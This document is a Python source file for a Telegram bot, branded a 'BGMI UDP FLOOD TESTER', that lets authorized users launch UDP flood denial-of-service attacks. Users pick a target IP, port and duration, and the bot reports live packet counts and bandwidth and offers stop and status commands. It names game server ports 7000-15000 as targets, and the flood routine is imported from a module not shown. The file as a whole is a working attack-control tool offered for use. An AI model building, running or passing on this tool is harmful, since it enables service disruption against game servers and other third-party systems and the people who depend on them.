#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import logging
import sys
import os
import time
import threading
from datetime import datetime
from telethon import TelegramClient, events
from colorama import Fore, Style, init

sys.path.append(os.path.dirname(os.path.abspath(__file__)))

import config
from modules.udp_flood import UDPFlood
from modules.utils import AttackUtils

init(autoreset=True)

# Logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

print(AttackUtils.get_banner())

# Bot
bot = TelegramClient(
    os.path.join(config.SESSION_DIR, 'bot'),
    config.API_ID,
    config.API_HASH
)

# Attacker
attacker = UDPFlood()

# Attack state
attack_running = False
attack_start_time = 0
attack_info = {}
live_msg = None
live_msg_task = None

def is_authorized(user_id):
    return user_id in config.AUTHORIZED_USERS

# ============================================
# LIVE STATUS UPDATER
# ============================================
async def update_live_status():
    """Update live attack status every 2 seconds"""
    global attack_running, attack_start_time, attack_info, live_msg
    
    while attack_running:
        try:
            elapsed = time.time() - attack_start_time
            remaining = attack_info['time'] - elapsed
            
            if remaining <= 0:
                break
            
            status_text = (
                f"🔥 **LIVE ATTACK STATUS** 🔥\n\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"🎯 Target: `{attack_info['ip']}:{attack_info['port']}`\n"
                f"⏱️ Elapsed: `{int(elapsed)}s`\n"
                f"⏱️ Remaining: `{int(remaining)}s`\n"
                f"⏱️ Total: `{attack_info['time']}s`\n"
                f"🧵 Threads: `{config.MAX_THREADS}`\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"📦 Packets: `{attacker.packets_sent:,}`\n"
                f"📤 Data: `{AttackUtils.format_bytes(attacker.bytes_sent)}`\n"
                f"❌ Errors: `{attacker.errors}`\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"🟢 **ATTACKING...**\n"
                f"🛑 Stop: `/stop`"
            )
            
            try:
                await live_msg.edit(status_text)
            except:
                pass
            
            await asyncio.sleep(2)
            
        except Exception as e:
            await asyncio.sleep(2)

# ============================================
# /attack COMMAND
# ============================================
@bot.on(events.NewMessage(pattern='/attack'))
async def attack_command(event):
    global attack_running, attack_start_time, attack_info, live_msg
    
    if not is_authorized(event.sender_id):
        await event.reply("❌ **Access Denied!**")
        return
    
    # Check if already attacking
    if attack_running:
        elapsed = time.time() - attack_start_time
        remaining = attack_info['time'] - elapsed
        await event.reply(
            f"⚠️ **ATTACK ALREADY RUNNING!**\n\n"
            f"🎯 Target: `{attack_info['ip']}:{attack_info['port']}`\n"
            f"⏱️ Elapsed: `{int(elapsed)}s`\n"
            f"⏱️ Remaining: `{int(remaining)}s`\n\n"
            f"🛑 Stop: `/stop`\n"
            f"📊 Status: `/status`"
        )
        return
    
    parts = event.text.split()
    
    if len(parts) != 4:
        await event.reply(
            "⚠️ **Usage:** `/attack <ip> <port> <time>`\n\n"
            "📋 **Example:**\n"
            "`/attack 192.168.1.1 8080 60`\n\n"
            "🎮 **BGMI Ports:** 7000-15000\n"
            f"⏱️ Max: {config.MAX_DURATION}s\n"
            f"🧵 Threads: {config.MAX_THREADS} (auto)"
        )
        return
    
    target_ip = parts[1]
    
    try:
        target_port = int(parts[2])
    except:
        await event.reply("❌ Port number hona chahiye!")
        return
    
    try:
        attack_time = int(parts[3])
        if attack_time < 1:
            await event.reply("❌ Time kam se kam 1 second hona chahiye!")
            return
        if attack_time > config.MAX_DURATION:
            await event.reply(f"❌ Max time {config.MAX_DURATION}s hai!")
            return
    except:
        await event.reply("❌ Time number hona chahiye!")
        return
    
    # Save attack info
    attack_info = {
        'ip': target_ip,
        'port': target_port,
        'time': attack_time
    }
    
    attack_start_time = time.time()
    attack_running = True
    
    # Initial message
    live_msg = await event.reply(
        f"🔥 **ATTACK STARTED!** 🔥\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 Target: `{target_ip}:{target_port}`\n"
        f"⏱️ Time: `{attack_time}s`\n"
        f"🧵 Threads: `{config.MAX_THREADS}`\n"
        f"📡 Type: UDP Flood\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⏳ Starting attack...\n"
        f"📊 Status update every 2s\n\n"
        f"🛑 Stop: `/stop`"
    )
    
    # Start live status updater in background
    asyncio.create_task(update_live_status())
    
    # Run attack in thread pool
    import concurrent.futures
    loop = asyncio.get_event_loop()
    
    try:
        with concurrent.futures.ThreadPoolExecutor() as pool:
            report = await loop.run_in_executor(
                pool,
                attacker.start_attack,
                target_ip,
                target_port,
                config.MAX_THREADS,
                attack_time
            )
        
        elapsed_str = AttackUtils.format_time(report['elapsed'])
        
        # Final report
        result_msg = (
            f"✅ **ATTACK COMPLETED!** ✅\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 **FINAL REPORT**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🎯 Target: `{target_ip}:{target_port}`\n"
            f"⏱️ Duration: `{elapsed_str}`\n"
            f"🧵 Threads: `{config.MAX_THREADS}`\n\n"
            f"📦 Packets Sent: `{report['packets']:,}`\n"
            f"📤 Data Sent: `{AttackUtils.format_bytes(report['bytes'])}`\n"
            f"⚡ Speed: `{report['packet_rate']:.0f} pkt/s`\n"
            f"📶 Bandwidth: `{report['mbps']:.2f} Mbps`\n"
            f"❌ Errors: `{report['errors']}`\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🟢 **SUCCESS** ✅\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🔄 New: `/attack IP PORT TIME`"
        )
        
        try:
            await live_msg.edit(result_msg)
        except:
            await event.reply(result_msg)
        
    except Exception as e:
        elapsed = time.time() - attack_start_time
        
        error_msg = (
            f"❌ **ATTACK ERROR!** ❌\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 Target: `{target_ip}:{target_port}`\n"
            f"⏱️ Elapsed: `{int(elapsed)}s`\n"
            f"🔴 Error: `{str(e)}`\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💡 Check:\n"
            f"• sudo se run karo\n"
            f"• Target online hai?\n"
            f"• Port open hai?\n"
            f"• Network stable?\n\n"
            f"🔄 Retry: `/attack {target_ip} {target_port} {attack_time}`"
        )
        
        try:
            await live_msg.edit(error_msg)
        except:
            await event.reply(error_msg)
    
    finally:
        attack_running = False
        attack_start_time = 0
        attack_info = {}
        live_msg = None

# ============================================
# /stop COMMAND
# ============================================
@bot.on(events.NewMessage(pattern='/stop'))
async def stop_command(event):
    global attack_running, attack_start_time, attack_info
    
    if not is_authorized(event.sender_id):
        return
    
    if attack_running:
        elapsed = time.time() - attack_start_time
        
        attacker.stop_attack()
        attack_running = False
        
        await event.reply(
            f"⛔ **ATTACK STOPPED!** ⛔\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 Target: `{attack_info['ip']}:{attack_info['port']}`\n"
            f"⏱️ Ran for: `{int(elapsed)}s`\n"
            f"📦 Packets: `{attacker.packets_sent:,}`\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"✅ Stopped by user.\n"
            f"🔄 New: `/attack IP PORT TIME`"
        )
        
        attack_start_time = 0
        attack_info = {}
    else:
        await event.reply(
            "💤 **No attack running!**\n\n"
            "Start: `/attack IP PORT TIME`"
        )

# ============================================
# /status COMMAND
# ============================================
@bot.on(events.NewMessage(pattern='/status'))
async def status_command(event):
    if not is_authorized(event.sender_id):
        return
    
    if attack_running:
        elapsed = time.time() - attack_start_time
        remaining = attack_info['time'] - elapsed
        
        await event.reply(
            f"📊 **CURRENT STATUS** 📊\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🟢 **ATTACKING** 🔥\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🎯 Target: `{attack_info['ip']}:{attack_info['port']}`\n"
            f"⏱️ Elapsed: `{int(elapsed)}s`\n"
            f"⏱️ Remaining: `{int(remaining)}s`\n"
            f"⏱️ Total: `{attack_info['time']}s`\n"
            f"🧵 Threads: `{config.MAX_THREADS}`\n\n"
            f"📦 Packets: `{attacker.packets_sent:,}`\n"
            f"📤 Data: `{AttackUtils.format_bytes(attacker.bytes_sent)}`\n"
            f"❌ Errors: `{attacker.errors}`\n\n"
            f"🛑 Stop: `/stop`"
        )
    else:
        await event.reply(
            "💤 **IDLE**\n\n"
            "Start: `/attack IP PORT TIME`"
        )

# ============================================
# /start COMMAND
# ============================================
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    if not is_authorized(event.sender_id):
        await event.reply("❌ Access Denied!")
        return
    
    await event.reply(
        f"🔥 **BGMI UDP FLOOD TESTER** 🔥\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⚔️ **COMMAND:**\n"
        f"`/attack <ip> <port> <time>`\n\n"
        f"📋 **Example:**\n"
        f"`/attack 192.168.1.1 8080 60`\n\n"
        f"🎮 **BGMI Ports:** 7000-15000\n"
        f"⏱️ Max: {config.MAX_DURATION}s\n"
        f"🧵 Threads: {config.MAX_THREADS}\n\n"
        f"📊 **Features:**\n"
        f"• Live status update\n"
        f"• Real packet counter\n"
        f"• Bandwidth meter\n"
        f"• Error tracking\n\n"
        f"🛑 `/stop` - Stop\n"
        f"📊 `/status` - Check\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⚠️ **Run with: sudo python3 main.py**\n"
        f"⚠️ Authorized use only!"
    )

# ============================================
# MAIN
# ============================================
async def main():
    await bot.start(bot_token=config.BOT_TOKEN)
    
    print(f"\n{Fore.GREEN}[✓] BOT STARTED SUCCESSFULLY!{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[+] Command: /attack IP PORT TIME{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[+] Threads: {config.MAX_THREADS}{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}[+] Max Time: {config.MAX_DURATION}s{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Live Status: ON (updates every 2s){Style.RESET_ALL}")
    print(f"{Fore.RED}[!] IMPORTANT: Run as ROOT!{Style.RESET_ALL}")
    print(f"{Fore.RED}[!] Command: sudo python3 main.py{Style.RESET_ALL}")
    print("-" * 50)
    
    await bot.run_until_disconnected()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Bot stopped.{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
